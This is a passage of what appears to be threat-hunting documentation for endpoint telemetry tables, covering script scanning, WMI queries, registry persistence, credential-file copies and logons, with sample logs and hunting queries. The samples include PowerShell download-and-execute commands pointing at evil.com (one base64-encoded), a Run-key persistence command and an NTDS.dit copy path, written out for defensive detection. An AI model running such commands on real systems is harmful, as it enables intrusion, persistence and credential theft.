  "ScriptContentSource": "2",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')"
}
```
---

### 5. Example Queries
```xql
// Find all malicious script detections
event_simpleName=ScriptControlDetectInfo

// Hunt for malicious scripts executed by PowerShell
event_simpleName=ScriptControlDetectInfo ImageFileName="*\\powershell.exe"

// Find detections where the script was passed via an encoded command line
event_simpleName=ScriptControlDetectInfo ScriptContentSource=3

// Search for specific malicious functions or commands within the script content
event_simpleName=ScriptControlDetectInfo ScriptContent="*Invoke-Mimikatz*" OR ScriptContent="*DownloadString*"

// Look for detections involving VBScript or JScript
event_simpleName=ScriptControlDetectInfo ScriptingLanguageId IN (4, 5)

// Find malicious scripts spawned by Microsoft Office applications
event_simpleName=ScriptControlDetectInfo ParentImageFileName IN ("*\\winword.exe", "*\\excel.exe", "*\\powerpnt.exe")
```
## ScriptControlScanInfo Table: Script Content Event

### 1. Table Name
**ScriptControlScanInfo**

---

### 2. Table Usage
This event provides the content of a script that was scanned by a script control engine, such as the Antimalware Scan Interface (AMSI) on Windows. This is a powerful event for threat hunting as it captures the actual script content at the time of execution, which helps in identifying malicious, fileless, or obfuscated attacks that might otherwise be missed.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ScriptContent | The full text content of the script that was scanned. | All |
| ScriptContentName | The name or identifier for the script content, if available. | macOS, Linux |
| ScriptContentSource | The source of the script content, such as from a file, the command line, or an interactive session. | Linux, Windows |

---

### 4. Sample Log Example

```json
{
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/payload.ps1](http://evil.com/payload.ps1)')",
  "ScriptContentName": "/tmp/run.sh",
  "ScriptContentSource": "1"
}
```

---
### 5. Example Queries
```xql
// Find all script control scan events
event_simpleName=ScriptControlScanInfo

// Hunt for specific keywords within the script content
event_simpleName=ScriptControlScanInfo ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Expression*"

// Find scripts that originated from the command line
event_simpleName=ScriptControlScanInfo ScriptContentSource=2

// Look for scripts that have a specific name
event_simpleName=ScriptControlScanInfo ScriptContentName="*malicious.ps1"
```
---
## ScriptControlScanTelemetry Table: Script Execution Event

### 1. Table Name
**ScriptControlScanTelemetry**

---

### 2. Table Usage
This event is generated when a script is scanned by a script control engine, such as the Antimalware Scan Interface (AMSI) on Windows. It captures the content of scripts as they are being executed, which is invaluable for detecting fileless malware, obfuscated commands, and other malicious in-memory activities that might otherwise evade detection.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`). | Windows Only |
| ParentImageFileName | The full path to the parent process that spawned the script host. | Windows Only |
| CommandLine | The command line of the script host process. | Windows Only |
| HostProcessType | The type of process hosting the script engine. | Windows Only |
| ScriptingLanguageId | An identifier for the scripting language being used (e.g., PowerShell, VBScript, JScript). | Windows Only |
| ScriptContentSource | The source of the script content (e.g., from the command line, a file, or interactive session). | Windows Only |
| ScriptContent | The full content of the script that was scanned. | Windows Only |
| ScriptContentBytes | The raw byte content of the script that was scanned. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
  "HostProcessType": "1",
  "ScriptingLanguageId": "1",
  "ScriptContentSource": "2",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')",
  "ScriptContentBytes": "494558284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f6576696c2e636f6d2f7374616765722e7073312729"
}
```

---

### 5. Example Queries

```xql
// Find all script control scan events
event_simpleName=ScriptControlScanTelemetry

// Hunt for scripts executed by PowerShell
event_simpleName=ScriptControlScanTelemetry ImageFileName="*\\powershell.exe"

// Find scripts where the parent process was something other than explorer.exe or cmd.exe
event_simpleName=ScriptControlScanTelemetry ParentImageFileName!="C:\\Windows\\explorer.exe" ParentImageFileName!="C:\\Windows\\System32\\cmd.exe"

// Search for suspicious keywords within the script content
event_simpleName=ScriptControlScanTelemetry ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Mimikatz*" OR ScriptContent="*Get-Keystrokes*"

// Find scripts that were passed via the command line (often obfuscated)
event_simpleName=ScriptControlScanTelemetry ScriptContentSource=2

// Look for JScript or VBScript execution, which is less common for legitimate admin tasks
event_simpleName=ScriptControlScanTelemetry ScriptingLanguageId IN (2, 3)
```
---
## ScriptFileWrittenInfo Table: Script File Content Event

### 1. Table Name
**ScriptFileWrittenInfo**

---

### 2. Table Usage
This event provides the full content of a script file that was written to disk on a Windows host. Attackers frequently drop malicious scripts (e.g., PowerShell, VBScript, Batch files) onto a system to download further malware, establish persistence, or perform reconnaissance. Capturing the full script content is invaluable for threat hunting and incident response, as it allows for immediate analysis of the script's intent and capabilities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The full path and file name where the script was written. | Windows Only |
| FileFormatString | The detected format of the script file (e.g., "PowerShell", "VBScript", "Batch"). | Windows Only |
| ScriptContent | The full text content of the script that was written to the file. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\update.ps1",
  "FileFormatString": "PowerShell",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://malicious.domain/payload.exe](http://malicious.domain/payload.exe)')"
}
```

---

### 5. Example Queries
```xql
// Find all instances of script files being written
event_simpleName=ScriptFileWrittenInfo

// Hunt for PowerShell scripts written to disk
event_simpleName=ScriptFileWrittenInfo FileFormatString="PowerShell"

// Find scripts written to a temporary or user-profile directory
event_simpleName=ScriptFileWrittenInfo TargetFileName="*\\Temp\\*" OR TargetFileName="*\\AppData\\*"

// Search for specific suspicious commands within the script content
event_simpleName=ScriptFileWrittenInfo ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Expression*" OR ScriptContent="*IEX*"

// Find potentially malicious VBScripts being dropped
event_simpleName=ScriptFileWrittenInfo TargetFileName="*.vbs" ScriptContent="*CreateObject*"
```
---
## SensitiveWmiQuery Table: WMI Query Event

### 1. Table Name
**SensitiveWmiQuery**

---

### 2. Table Usage
This event is generated when a client process executes a sensitive Windows Management Instrumentation (WMI) query. Attackers often use WMI to perform reconnaissance (e.g., enumerating antivirus products, listing processes), execute code, and move laterally within a network. Monitoring these queries is critical for detecting such malicious activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| WmiQuery | The WQL (WMI Query Language) query that was executed. | Windows Only |
| WmiNamespaceName | The WMI namespace that the query was targeting (e.g., `root\cimv2`). | Windows Only |
| UserName | The name of the user who executed the WMI query. | Windows Only |
| ClientComputerName | The name of the computer from which the query was initiated. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "WmiQuery": "SELECT * FROM AntiVirusProduct",
  "WmiNamespaceName": "root\\SecurityCenter2",
  "UserName": "CORP\\Admin",
  "ClientComputerName": "WORKSTATION-01"
}
```
---
### 5. Example Queries

```xql
// Find all sensitive WMI queries
event_simpleName=SensitiveWmiQuery

// Hunt for WMI queries used to enumerate antivirus products
event_simpleName=SensitiveWmiQuery WmiQuery="*AntiVirusProduct*"

// Find sensitive WMI queries targeting the default CIMv2 namespace
event_simpleName=SensitiveWmiQuery WmiNamespaceName="root\\cimv2"

// Look for queries attempting to find running processes
event_simpleName=SensitiveWmiQuery WmiQuery="*Win32_Process*"

// Investigate queries made by a specific user
event_simpleName=SensitiveWmiQuery UserName="*svc_account*"
```
---
## ServiceStarted Table: Service Start Event

### 1. Table Name
**ServiceStarted**

---

### 2. Table Usage
This event is generated when a standalone service is started by the Windows Service Control Manager (SCM). Attackers often use services to establish persistence or run malicious code with elevated privileges. This event provides details about the new service, including its executable path and command line, as well as information about the process that initiated the start request.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the main executable for the new service. | Windows Only |
| ServiceDisplayName | The display name of the service being started. | Windows Only |
| UserName | The user account under which the service is configured to run. | Windows Only |
| CommandLine | The command line used to start the service's process. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the RPC client that requested the service to start (e.g., the PID for `services.exe`). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\evil.exe",
  "ServiceDisplayName": "Malicious Updater Service",
  "UserName": "LocalSystem",
  "CommandLine": "C:\\Windows\\System32\\evil.exe -run",
  "RpcClientProcessId": "784"
}
```
---

### 5. Example Queries

```xql
// Find all service start events
event_simpleName=ServiceStarted

// Hunt for services running from unusual locations, like Temp directories
event_simpleName=ServiceStarted ImageFileName="*\\Temp\\*"

// Find services with suspicious display names
event_simpleName=ServiceStarted ServiceDisplayName="*malware*" OR ServiceDisplayName="*backdoor*"

// Find services started with PowerShell in the command line
event_simpleName=ServiceStarted CommandLine="*powershell.exe*"

// Investigate which process requested a specific service to start
event_simpleName=ServiceStarted ServiceDisplayName="SuspiciousSvc" | table RpcClientProcessId
```
---
## SevenZipFileWritten Table: File Written Event

### 1. Table Name
**SevenZipFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a 7-Zip archive file (.7z). Attackers often use archiving tools like 7-Zip to compress and stage stolen data before exfiltration. Monitoring the creation of these files is useful for investigating data staging, potential data theft, and malware deployment.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Documents\\archive.7z",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "archive.7z"
}
```

---

### 5. Example Queries
```xql
// Find all 7-Zip files written to disk
event_simpleName=SevenZipFileWritten TargetFileName="*.7z"

// Find 7-Zip files written to a network drive (Windows only)
event_simpleName=SevenZipFileWritten IsOnNetwork=true

// Find 7-Zip files written to a removable disk (Windows only)
event_simpleName=SevenZipFileWritten IsOnRemovableDisk=true

// Investigate 7-Zip file writes by a specific file operator SID (Windows only)
event_simpleName=SevenZipFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find 7-Zip files based on their context base file name, which might indicate staging
event_simpleName=SevenZipFileWritten ContextBaseFileName="*secret*.7z"
```
---
## SmtpCommand Table: SMTP Command Event

### 1. Table Name
**SmtpCommand**

---

### 2. Table Usage
This event is generated when an SMTP (Simple Mail Transfer Protocol) command is issued on a Linux host. Attackers may use SMTP for data exfiltration, sending stolen data as email messages or attachments. Monitoring these commands can help detect such malicious activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process that issued the SMTP command. | Linux Only |
| CommandLine | The full command line of the process that issued the command. | Linux Only |
| SmtpCommandKind | The type of SMTP command issued, such as `MAIL` (4) or `DATA` (7). | Linux Only |
| CommandArg1 | The first argument of the SMTP command, which often contains sender or recipient information. | Linux Only |
| RemoteAddressIP4 | The IPv4 address of the remote mail server. | Linux Only |
| RemotePort | The port on the remote server to which the connection was made (typically 25, 465, or 587). | Linux Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "/usr/sbin/sendmail",
  "CommandLine": "sendmail -t",
  "SmtpCommandKind": "4",
  "CommandArg1": "FROM:<attacker@evil.com>",
  "RemoteAddressIP4": "198.51.100.10",
  "RemotePort": "25"
}
```
---

### 5. Example Queries
```xql
// Find all SMTP commands
event_simpleName=SmtpCommand

// Find all MAIL FROM commands, which indicate the start of an email transaction
event_simpleName=SmtpCommand SmtpCommandKind=4

// Hunt for specific commands being sent to an external mail server
event_simpleName=SmtpCommand RemoteAddressIP4!="10.0.0.0/8" RemoteAddressIP4!="172.16.0.0/12" RemoteAddressIP4!="192.168.0.0/16"

// Look for processes other than common mail clients issuing SMTP commands
event_simpleName=SmtpCommand ImageFileName!="/usr/sbin/sendmail" ImageFileName!="/usr/sbin/postfix"

// Find commands that specify a particular sender
event_simpleName=SmtpCommand CommandArg1="*<suspicious-sender@domain.com>*"
```
---
## SuspiciousCreateSymbolicLink Table: Symbolic Link Creation Event

### 1. Table Name
**SuspiciousCreateSymbolicLink**

---

### 2. Table Usage
This event is generated when a suspicious symbolic link is created on a Windows host. Attackers can abuse symbolic links to redirect file operations, which can lead to privilege escalation (e.g., UAC bypass) or be used as a persistence mechanism. Monitoring the creation of these links is important for detecting such malicious activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process that created the symbolic link (e.g., `cmd.exe`). | Windows Only |
| CommandLine | The command line used by the process to create the symbolic link. | Windows Only |
| SymbolicLinkTarget | The target path to which the symbolic link points. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "mklink C:\\Users\\Public\\exploit.dll C:\\Windows\\System32\\uxtheme.dll",
  "SymbolicLinkTarget": "C:\\Windows\\System32\\uxtheme.dll"
}
```
---
### 5. Example Queries
```xql
// Find all suspicious symbolic link creation events
event_simpleName=SuspiciousCreateSymbolicLink

// Find symbolic links created by cmd.exe
event_simpleName=SuspiciousCreateSymbolicLink ImageFileName="*\\cmd.exe"

// Hunt for symbolic links that point to files in the System32 directory
event_simpleName=SuspiciousCreateSymbolicLink SymbolicLinkTarget="*\\System32\\*"

// Find symbolic links created with a specific command line
event_simpleName=SuspiciousCreateSymbolicLink CommandLine="*mklink*"
```
---
## SuspiciousDnsRequest Table: Suspicious DNS Request Event

### 1. Table Name
**SuspiciousDnsRequest**

---

### 2. Table Usage
This event is generated when the sensor detects a suspicious DNS request. A request is considered suspicious if it is attempting to resolve a domain that is on the sensor's list of known malicious or suspicious domains. This is often an indicator of command-and-control (C2) communication, malware download, or other malicious activity.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| DomainName | The suspicious domain name that was queried. | All |
| RequestType | The type of DNS record requested (e.g., A, AAAA, CNAME, TXT). | All |

---

### 4. Sample Log Example

```json
{
  "DomainName": "malicious-c2-domain.com",
  "RequestType": "1"
}
```
---

### 5. Example Queries
```xql
// Find all suspicious DNS requests
event_simpleName=SuspiciousDnsRequest

// Hunt for requests to a specific suspicious domain
event_simpleName=SuspiciousDnsRequest DomainName="*evil-domain.net"

// Find suspicious DNS requests for TXT records, which can be used for C2
event_simpleName=SuspiciousDnsRequest RequestType=16

// Find suspicious requests for A records (IPv4)
event_simpleName=SuspiciousDnsRequest RequestType=1
```
---
## SuspiciousEseFileWritten Table: Credential File Copy Event

### 1. Table Name
**SuspiciousEseFileWritten**

---

### 2. Table Usage
This event indicates that a possible domain credential file (NTDS.dit) was copied, likely from a volume snapshot. The NTDS.dit file contains the Active Directory database, including user password hashes. Attackers copy this file to perform offline credential theft attacks. Monitoring this event is critical for detecting attempts to compromise an entire domain.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| SourceFileName | The original name of the file that was copied, typically `ntds.dit`. | Windows Only |
| TargetFileName | The destination path where the credential file was written. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "SourceFileName": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit",
  "TargetFileName": "C:\\Windows\\Temp\\activedirectory.dat"
}
```

---

### 5. Example Queries
```xql
// Find all suspicious ESE file write events
event_simpleName=SuspiciousEseFileWritten

// Find instances where ntds.dit is copied from a volume shadow copy
event_simpleName=SuspiciousEseFileWritten SourceFileName="*\\ntds.dit"

// Hunt for ntds.dit being saved with a different name
event_simpleName=SuspiciousEseFileWritten TargetFileName!="*\\ntds.dit"
```
---
## SuspiciousPrivilegedProcessHandle Table: Privileged Process Handle Event

### 1. Table Name
**SuspiciousPrivilegedProcessHandle**

---

### 2. Table Usage
This event is generated when a suspicious handle is opened to a privileged process. This technique is often used by credential theft tools (like Mimikatz) to access the memory of sensitive processes like LSASS. Monitoring this event is critical for detecting attempts to steal credentials.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetProcessId | The unique ID of the privileged process to which the handle was opened. | Windows Only |
| HandleCreated | The handle that was created to the target process. | Windows Only |
| SuspiciousHandleOpenReason | The reason the handle open was flagged as suspicious. Values include `1` (Opened by LSASS) and `2` (Opened by a low-integrity process). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": "684",
  "HandleCreated": "2540",
  "SuspiciousHandleOpenReason": "1"
}
```
---
### 5. Example Queries
```xql
// Find all suspicious handle open events to privileged processes
event_simpleName=SuspiciousPrivilegedProcessHandle

// Find handles opened to a specific privileged process, such as LSASS
event_simpleName=SuspiciousPrivilegedProcessHandle TargetProcessId="684"

// Find handles opened by a low-integrity process
event_simpleName=SuspiciousPrivilegedProcessHandle SuspiciousHandleOpenReason=2
```
---
## SuspiciousRegAsepUpdate Table: Registry Persistence Event

### 1. Table Name
**SuspiciousRegAsepUpdate**

---

### 2. Table Usage
This event describes registry activity that triggered a detection for a suspicious update to an Autostart Extension Point (ASEP). ASEPs are registry keys that cause programs to run automatically (e.g., at startup or user logon). Attackers frequently modify these keys to establish persistence on a compromised system.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path of the process that performed the suspicious registry modification. | Windows Only |
| CommandLine | The full command line of the process that performed the registry modification. | Windows Only |
| RegOperationType | The type of registry operation, such as creating a key or setting a value. | Windows Only |
| RegKeyName | The full path of the registry key that was modified. | Windows Only |
| RegValueName | The name of the specific registry value that was created or modified. | Windows Only |
| RegStringValue | The string data written to the registry value. This often contains the path to the malicious executable. | Windows Only |
| TargetFileName | The file path specified within the registry value that is intended for auto-execution. | Windows Only |
| TargetCommandLineParameters | The command-line parameters associated with the `TargetFileName` in the registry value. | Windows Only |
| RegObjectName | The name of the registry object being manipulated. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\reg.exe",
  "CommandLine": "reg.exe add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"MalwareUpdater\" /t REG_SZ /d \"C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe\"",
  "RegOperationType": "1",
  "RegKeyName": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  "RegValueName": "MalwareUpdater",
  "RegStringValue": "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe",
  "TargetFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.exe",
  "TargetCommandLineParameters": "",
  "RegObjectName": "\\REGISTRY\\USER\\S-1-5-21-12345\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
}
```

---

### 5. Example Queries

```xql
// Find all suspicious ASEP updates
event_simpleName=SuspiciousRegAsepUpdate

// Hunt for modifications to common Run keys
event_simpleName=SuspiciousRegAsepUpdate RegKeyName="*\\CurrentVersion\\Run"

// Find ASEP updates performed by PowerShell
event_simpleName=SuspiciousRegAsepUpdate ImageFileName="*\\powershell.exe"

// Search for a specific executable being set for persistence
event_simpleName=SuspiciousRegAsepUpdate TargetFileName="*\\evil.exe"

// Look for ASEP updates that set a value containing a script file
event_simpleName=SuspiciousRegAsepUpdate RegStringValue="*.js" OR RegStringValue="*.vbs" OR RegStringValue="*.ps1"
```
---
## TarFileWritten Table: File Written Event

### 1. Table Name
**TarFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a TAR (Tape Archive) file. Attackers often use TAR files to aggregate stolen data before exfiltration. Monitoring the creation of these files is useful for investigating data staging, potential data theft, and malware deployment.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/tmp/staged_data.tar",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "staged_data.tar"
}
```
---
### 5. Example Queries
```xql
// Find all TAR files written to disk
event_simpleName=TarFileWritten TargetFileName="*.tar"

// Find TAR files written to a network drive (Windows only)
event_simpleName=TarFileWritten IsOnNetwork=true

// Find TAR files written to a removable disk (Windows only)
event_simpleName=TarFileWritten IsOnRemovableDisk=true

// Investigate TAR file writes by a specific file operator SID (Windows only)
event_simpleName=TarFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find TAR files based on their context base file name, which might indicate staging
event_simpleName=TarFileWritten ContextBaseFileName="*backup*.tar"
```
---
## TiffFileWritten Table: File Written Event

### 1. Table Name
**TiffFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a TIFF (Tagged Image File Format) file. While TIFF is a common image format, it has also been associated with vulnerabilities in image parsing libraries and can be used for steganography. Monitoring the creation of these files can be useful for investigating malware delivery and data hiding techniques.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Pictures\\scan_001.tiff",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "scan_001.tiff"
}
```
---
### 5. Example Queries
```xql
// Find all TIFF files written to disk
event_simpleName=TiffFileWritten TargetFileName="*.tiff" OR TargetFileName="*.tif"

// Find TIFF files written to a network drive (Windows only)
event_simpleName=TiffFileWritten IsOnNetwork=true

// Find TIFF files written to a removable disk (Windows only)
event_simpleName=TiffFileWritten IsOnRemovableDisk=true

// Investigate TIFF file writes by a specific file operator SID (Windows only)
event_simpleName=TiffFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find TIFF files based on their context base file name
event_simpleName=TiffFileWritten ContextBaseFileName="secret_scan.tif"
```
---
## TokenImpersonated Table: Token Impersonation Event

### 1. Table Name
**TokenImpersonated**

---

### 2. Table Usage
This event is generated when a token impersonation action occurs on a Windows host. Token impersonation is a technique used by adversaries to escalate privileges or move laterally by using the security context of another user. Monitoring this event provides detailed "before and after" information, which is critical for detecting and investigating potential credential theft and privilege escalation attacks.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImpersonatedUserName | The name of the user account whose token is being used for impersonation. | Windows Only |
| OriginalUserName | The name of the user account that is performing the impersonation. | Windows Only |
| OriginalUserSid | The Security Identifier (SID) of the original user account that initiated the impersonation. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImpersonatedUserName": "NT AUTHORITY\\SYSTEM",
  "OriginalUserName": "CORP\\jsmith",
  "OriginalUserSid": "S-1-5-21-1234567890-123456789-1234567890-1001"
}
```

### 5. Example Queries
```xql
// Find all token impersonation events
event_simpleName=TokenImpersonated

// Find instances where a specific user is performing impersonation
event_simpleName=TokenImpersonated OriginalUserName="CORP\\suspicious_user"

// Find instances where a high-privilege account is being impersonated
event_simpleName=TokenImpersonated ImpersonatedUserName="*SYSTEM"

// Investigate token impersonation by a specific original user SID
event_simpleName=TokenImpersonated OriginalUserSid="S-1-5-21-1234567890-123456789-1234567890-500"
```
---
## UnsignedModuleLoad Table: Unsigned Module Load Event

### 1. Table Name
**UnsignedModuleLoad**

***

### 2. Table Usage
This event contains information about an unsigned module that was loaded into a target process. It combines relevant information from the ImageHash and SignInfoWithCertAndContext events for the unsigned module. Monitoring this event is important because malware often uses unsigned modules to execute malicious code.

***

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the unsigned module (e.g., DLL, EXE) that was loaded. | Windows Only |
| MappedFromUserMode | Indicates whether this module is loaded into user memory space (non-zero) or kernel space (zero). | Windows Only |
| ModuleCharacteristics | A bitmask field indicating optional characteristics of the loaded module, such as whether it's an executable or a DLL. | Windows Only |
| TargetProcessId | The unique ID of the process into which the unsigned module was loaded. | Windows Only |
| SHA256HashData | The SHA256 hash of the unsigned module file. | Windows Only |

***

### 4. Sample Log Example
```json
{
  "ImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious.dll",
  "MappedFromUserMode": 1,
  "ModuleCharacteristics": "8194",
  "TargetProcessId": "4321",
  "SHA256HashData": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
}
```

---

### 5. Example Queries
```xql
// Find all unsigned modules loaded by a specific process
event_simpleName=UnsignedModuleLoad TargetProcessId="1234"

// Search for a specific unsigned DLL being loaded
event_simpleName=UnsignedModuleLoad ImageFileName="*evil.dll"

// Hunt for unsigned modules using their SHA256 hash
event_simpleName=UnsignedModuleLoad SHA256HashData="a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"

// Find all unsigned modules loaded into user memory space
event_simpleName=UnsignedModuleLoad MappedFromUserMode=1
```
---
## UserAccountCreated Table: User Account Creation Event

### 1. Table Name
**UserAccountCreated**

---

### 2. Table Usage
This event is generated when a new user account is created on a Windows host. Monitoring this event is crucial for security, as unexpected account creation can be an indicator of malicious activity, such as an attacker establishing persistence on a system. The event data can help identify the initial process (e.g., command-line tool, custom utility) or remote host that initiated the action.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the new user account that was created. | Windows Only |
| RpcClientProcessId | The Process ID (PID) corresponding to the RPC client of this request. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "UserName": "TempAdmin01",
  "RpcClientProcessId": "784"
}
```

---

### 5. Example Queries

```xql// Find all user account creation events
event_simpleName=UserAccountCreated

// Investigate the creation of a specific user account
event_simpleName=UserAccountCreated UserName="BackupSvc"

// Find all user accounts created by a specific parent process ID
event_simpleName=UserAccountCreated RpcClientProcessId="1337"
```
---
## UserAccountDeleted Table: User Account Deletion Event

### 1. Table Name
**UserAccountDeleted**

---

### 2. Table Usage
This event is generated when a user account is deleted on a Windows host. It is critical for security auditing, as it can indicate malicious activity, such as an attacker trying to cover their tracks. The event can help identify the process or remote host that initiated the deletion.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the user account that was deleted. | Windows, Forensics |
| RpcClientProcessId | The Process ID (PID) of the RPC client that initiated the account deletion request. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "UserName": "TempAdmin",
  "RpcClientProcessId": "784"
}
```
---
### 5. Example Queries
```xql
// Find all user account deletion events
event_simpleName=UserAccountDeleted

// Investigate which process was responsible for deleting a specific user account
event_simpleName=UserAccountDeleted UserName="service-acct"

// Find all user accounts deleted by a specific process ID
event_simpleName=UserAccountDeleted RpcClientProcessId="1337"
```
---
## UserLogon Table: User Logon Event

### 1. Table Name
**UserLogon**

---

### 2. Table Usage
This event is generated when a user successfully logs on to a host. It is crucial for monitoring access control, establishing a baseline of normal user activity, and detecting suspicious logon events that could indicate compromised credentials or lateral movement.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the user that logged on. | All |
| UserSid | The Security Identifier (SID) of the user who logged on. | Windows, macOS |
| LogonDomain | The domain against which the user was authenticated. | Windows Only |
| LogonServer | The name of the server that processed the logon request. | Windows Only |
| LogonType | Indicates the type of logon that occurred, such as Interactive (2) or Network (3). | All |
| UserIsAdmin | A boolean value that is true if the user has local administrator privileges. | Linux, Windows |
| RemoteAddressIP4 | The source IPv4 address from which the logon originated, if the logon was remote. | Linux, Windows, macOS |
| UserLogonFlags | Flags providing additional context about the user and the logon session, such as if the user is an administrator (`USER_IS_ADMIN`). | Windows, macOS |

---

### 4. Sample Log Example

```json
{
  "UserName": "JSmith",
  "UserSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "LogonDomain": "CORPORATE",
  "LogonServer": "DC01",
  "LogonType": "10",
  "UserIsAdmin": true,
  "RemoteAddressIP4": "192.168.1.100",
  "UserLogonFlags": "2"
}
```

---

### 5. Example Queries
```xql
// Find all logon events for a specific user
event_simpleName=UserLogon UserName="administrator"

// Find all remote interactive logons (LogonType=10) from a specific IP address
